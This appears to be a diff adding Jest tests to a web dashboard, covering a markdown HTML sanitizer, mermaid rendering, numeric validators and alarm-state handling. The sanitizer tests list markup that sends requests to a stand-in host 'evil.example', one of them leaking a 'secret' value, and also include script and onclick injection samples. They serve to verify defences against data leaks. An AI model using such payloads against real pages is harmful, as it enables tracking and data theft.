@@ -99,6 +99,71 @@ test('wrapScrollableTables', () => {
   expect(app.wrapScrollableTables(wrapped)).toBe(wrapped);
 });
 
+test('formatMarkdown does not load external resources', () => {
+  const html = app.formatMarkdown('![x](https://evil.example/leak?d=secret) [link](https://evil.example/page)');
+  const root = document.createElement('div');
+  root.innerHTML = html;
+
+  expect(root.querySelector('img')).toBeNull();
+  const links = root.querySelectorAll('a');
+  expect(links[0].getAttribute('href')).toBe('https://evil.example/leak?d=secret');
+  expect(links[0].textContent).toBe('External image not loaded: https://evil.example/leak?d=secret');
+  expect(links[1].getAttribute('rel')).toBe('noopener noreferrer');
+  expect(links[1].getAttribute('target')).toBe('_blank');
+
+  expect(app.formatMarkdown('![x](https://evil.example/a)', true)).not.toContain('<img');
+});
+
+test('formatMarkdown loads external images only in authored text the admin allows', () => {
+  const markdown = '![x](https://intranet.example/a.png)';
+  const params = app.parameters;
+  try {
+    app.parameters = { allowExternalMarkdownImages: false };
+    expect(app.formatMarkdown(markdown, false, true)).not.toContain('<img');
+
+    app.parameters = { allowExternalMarkdownImages: true };
+    expect(app.formatMarkdown(markdown, false, true)).toContain('<img src="https://intranet.example/a.png"');
+    expect(app.formatMarkdown(markdown, true, true)).toContain('<img src="https://intranet.example/a.png"');
+    expect(app.formatMarkdown(markdown)).not.toContain('<img');
+    expect(app.formatMarkdownMermaid(markdown)).not.toContain('<img');
+  } finally {
+    app.parameters = params;
+  }
+});
+
+test('sanitizeMarkdownHtml', () => {
+  expect(app.sanitizeMarkdownHtml('')).toBe('');
+  expect(app.sanitizeMarkdownHtml(null)).toBe('');
+
+  const blocked = [
+    '<img srcset="https://evil.example/a 1x">',
+    '<div style="background:url(https://evil.example/b)">x</div>',
+    '<video poster="https://evil.example/c" src="https://evil.example/d"></video>',
+    '<audio src="https://evil.example/e"></audio>',
+    '<picture><source srcset="https://evil.example/f"></picture>',
+    '<input type="image" src="https://evil.example/g">',
+    '<table background="https://evil.example/h"><tbody><tr><td>x</td></tr></tbody></table>',
+    '<svg><image href="https://evil.example/i"></image></svg>',
+    '<a href="/x" ping="https://evil.example/j">x</a>',
+    '<img src="https://evil.example:bad">',
+  ];
+  blocked.forEach(html => {
+    const root = document.createElement('div');
+    root.innerHTML = app.sanitizeMarkdownHtml(html);
+    expect(root.querySelector('img[src], video, audio, source, input, svg, [style], [srcset], [background], [poster], [ping]')).toBeNull();
+  });
+
+  const kept = [
+    '<img src="images/logo.svg">',
+    '<img src="data:image/png;base64,AAAA">',
+    '<pre class="mermaid">graph TD\nA</pre>',
+    '<table><thead><tr><th align="center">h</th></tr></thead></table>',
+  ];
+  kept.forEach(html => expect(app.sanitizeMarkdownHtml(html)).toBe(html));
+
+  expect(app.sanitizeMarkdownHtml('<a href="/x">x</a>')).toBe('<a href="/x">x</a>');
+});
+
 test('formatMarkdownSanitizesTables', () => {
   // Wrapping happens after sanitization, so unsafe markup around a table is still stripped.
   const html = app.formatMarkdown('| a |\n| --- |\n| 1 |\n\n<p onclick="evil()">x</p><script>evil()</script>');
@@ -1449,6 +1514,27 @@ graph TD
   expect(app.performMermaidRegexes(mermaidWithBothIssues)).toBe(expectedBothFixed);
 });
 
+test('formatMarkdownMermaid', () => {
+  const formatMarkdown = jest.spyOn(app, 'formatMarkdown').mockImplementation(text => '<p>' + text + '</p>');
+  const renderMermaid = jest.spyOn(app, 'renderMermaid').mockImplementation(() => {});
+
+  expect(app.formatMarkdownMermaid('```mermaid\nA[Start: Begin]\n```')).toBe('<p>```mermaid\nA[Start∶ Begin]\n```</p>');
+  expect(formatMarkdown).toHaveBeenCalledWith('```mermaid\nA[Start∶ Begin]\n```', true, false);
+  expect(renderMermaid).toHaveBeenCalledTimes(1);
+
+  app.formatMarkdownMermaid('streaming', false);
+  expect(renderMermaid).toHaveBeenCalledTimes(1);
+
+  app.formatMarkdownMermaid('```mermaid\nAlice->>Bob: Hello\n```', true, true);
+  expect(formatMarkdown).toHaveBeenLastCalledWith('```mermaid\nAlice->>Bob: Hello\n```', true, true);
+
+  expect(app.formatMarkdownMermaid('')).toBe('');
+  expect(app.formatMarkdownMermaid(null)).toBe('');
+
+  formatMarkdown.mockRestore();
+  renderMermaid.mockRestore();
+});
+
 test('verifyRuleSyntax - implementation', () => {
   const _old = app.ruleValidators;
 	app.ruleValidators = {
@@ -1647,6 +1733,29 @@ test('validator: maxLength factory', () => {
   expect(v5('abcdef')).toBe(_i18n.ruleMaxLen);
 });
 
+test('validator: minValue factory', () => {
+  const v0 = app.validators.minValue(0);
+  const message = _i18n.ruleMinValue.replace('{limit}', 0);
+  expect(v0(0)).toBe(true);
+  expect(v0(0.5)).toBe(true);
+  expect(v0('3')).toBe(true);
+  expect(v0(-1)).toBe(message);
+  expect(v0('')).toBe(message);
+  expect(v0(null)).toBe(message);
+  expect(v0('abc')).toBe(message);
+});
+
+test('validator: maxValue factory', () => {
+  const v1 = app.validators.maxValue(1);
+  const message = _i18n.ruleMaxValue.replace('{limit}', 1);
+  expect(v1(1)).toBe(true);
+  expect(v1(0.25)).toBe(true);
+  expect(v1(1.5)).toBe(message);
+  expect(v1('')).toBe(message);
+  expect(v1(null)).toBe(message);
+  expect(v1('abc')).toBe(message);
+});
+
 test('validator: fileSizeLimit factory', () => {
   const formatFn = (n) => n + ' bytes';
   const v = app.validators.fileSizeLimit(1000, formatFn);
@@ -1757,4 +1866,128 @@ test('parseMultiDocYaml', () => {
   expect(app.parseMultiDocYaml('---\nid: a\nlevel: 3\n---\n---\nname: b\n')).toEqual([{ id: 'a', level: '3' }, { name: 'b' }]);
   expect(app.parseMultiDocYaml('')).toEqual([]);
   expect(app.parseMultiDocYaml('id: a\n---\n')).toEqual([{ id: 'a' }]);
+});
+
+test('loadAlarmStates populates alarmStates and marks alarmStatesLoaded even without notification license', async () => {
+  app.username = 'test@example.com';
+  app.isLicensed = jest.fn(() => false);
+  app.alarmStates = [];
+  app.alarmStatesLoaded = false;
+
+  resetPapi();
+  const mockStates = [{ alarmId: 'alarm-1', nodeId: 'node-1', status: 'alarm' }];
+  app.papi.get = jest.fn().mockResolvedValue({ data: mockStates });
+
+  await app.loadAlarmStates();
+
+  expect(app.papi.get).toHaveBeenCalledWith('alarms/states');
+  expect(app.alarmStates).toEqual(mockStates);
+  expect(app.alarmStatesLoaded).toBe(true);
+});
+
+test('loadServerSettings fetches alarm states on initial load and skips subsequent loads when already loaded', async () => {
+  app.username = 'test@example.com';
+  app.alarmStatesLoaded = false;
+  const originalLoadAlarmStates = app.loadAlarmStates;
+  app.loadAlarmStates = jest.fn().mockImplementation(() => {
+    app.alarmStatesLoaded = true;
+    return Promise.resolve();
+  });
+
+  const fakeInfo = {
+    userId: 'user-1',
+    notificationsStarted: false,
+    parameters: {},
+  };
+
+  stubServerSettings({});
+  app.papi.get = jest.fn().mockResolvedValue({ data: fakeInfo });
+
+  // First call: alarm states not yet loaded
+  await app.loadServerSettings();
+  expect(app.loadAlarmStates).toHaveBeenCalledTimes(1);
+
+  // Second call: alarm states already loaded, should NOT fetch again
+  app.loadServerSettingsTime = 0;
+  await app.loadServerSettings();
+  expect(app.loadAlarmStates).toHaveBeenCalledTimes(1);
+
+  app.loadAlarmStates = originalLoadAlarmStates;
+});
+
+test('openWebsocket onopen reloads alarm states to reconcile state on reconnect', () => {
+  app.loadAlarmStates = jest.fn();
+  app.updateStatus = jest.fn();
+  app.wsUrl = 'ws://localhost/ws';
+  app.socket = null;
+
+  global.WebSocket = jest.fn().mockImplementation(() => {
+    return {
+      readyState: 0,
+      onopen: null,
+      onclose: null,
+      onmessage: null,
+      onerror: null,
+    };
+  });
+
+  app.openWebsocket();
+  expect(app.socket).not.toBeNull();
+  expect(typeof app.socket.onopen).toBe('function');
+
+  app.socket.onopen({});
+
+  expect(app.loadAlarmStates).toHaveBeenCalled();
+  expect(app.connected).toBe(true);
+});
+
+test('onAlarmDelete removes matching alarm states and updates UI indicators', () => {
+  app.updateStatus = jest.fn();
+  app.setFavicon = jest.fn();
+  app.updateTitle = jest.fn();
+
+  app.alarmStates = [
+    { alarmId: 'alarm-1', nodeId: 'node-1', status: 'alarm' },
+    { alarmId: 'alarm-2', nodeId: 'node-2', status: 'alarm' },
+  ];
+
+  expect(app.isAlarmActive()).toBe(true);
+
+  // Delete alarm-1 via object payload
+  app.onAlarmDelete({ alarmId: 'alarm-1' });
+
+  expect(app.alarmStates).toEqual([
+    { alarmId: 'alarm-2', nodeId: 'node-2', status: 'alarm' },
+  ]);
+  expect(app.updateStatus).toHaveBeenCalledTimes(1);
+  expect(app.setFavicon).toHaveBeenCalledTimes(1);
+  expect(app.updateTitle).toHaveBeenCalledTimes(1);
+  expect(app.isAlarmActive()).toBe(true);
+
+  // Delete alarm-2 via string payload
+  app.onAlarmDelete('alarm-2');
+
+  expect(app.alarmStates).toEqual([]);
+  expect(app.updateStatus).toHaveBeenCalledTimes(2);
+  expect(app.setFavicon).toHaveBeenCalledTimes(2);
+  expect(app.updateTitle).toHaveBeenCalledTimes(2);
+  expect(app.isAlarmActive()).toBe(false);
+});
+
+test('onAlarmDelete handles missing/non-matching payloads gracefully', () => {
+  app.updateStatus = jest.fn();
+  app.setFavicon = jest.fn();
+  app.updateTitle = jest.fn();
+
+  app.alarmStates = [
+    { alarmId: 'alarm-1', nodeId: 'node-1', status: 'alarm' },
+  ];
+
+  app.onAlarmDelete(null);
+  app.onAlarmDelete({});
+  app.onAlarmDelete('');
+  app.onAlarmDelete({ alarmId: 'alarm-nonexistent' });
+
+  expect(app.alarmStates).toHaveLength(1);
+  expect(app.updateStatus).not.toHaveBeenCalled();
 });
